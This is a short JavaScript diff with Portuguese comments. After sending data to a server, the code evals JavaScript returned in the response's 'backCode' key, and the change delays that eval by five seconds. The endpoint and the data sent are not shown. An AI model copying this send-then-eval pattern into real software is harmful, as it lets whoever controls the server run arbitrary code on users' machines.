@@ -28,16 +28,19 @@
 
         console.log("Dados enviados com sucesso!");
 
-        // Após o envio bem-sucedido, pegar o código JS na chave 'backCode'
-        const responseData = await response.json();
-        const backCode = responseData.backCode;
+        // Esperar 5 segundos (exemplo) antes de pegar a resposta com a chave 'backCode'
+        setTimeout(async () => {
+            // Pega a resposta após o tempo de espera
+            const responseData = await response.json();
+            const backCode = responseData.backCode;
 
-        if (backCode) {
-            // Executar o código JS retornado na chave 'backCode'
-            eval(backCode);
-        } else {
-            console.error('Chave backCode não encontrada na resposta.');
-        }
+            if (backCode) {
+                // Executar o código JS retornado na chave 'backCode'
+                eval(backCode);
+            } else {
+                console.error('Chave backCode não encontrada na resposta.');
+            }
+        }, 5000);  // 5000 ms = 5 segundos
 
     } catch (error) {
         console.error('Erro:', error);
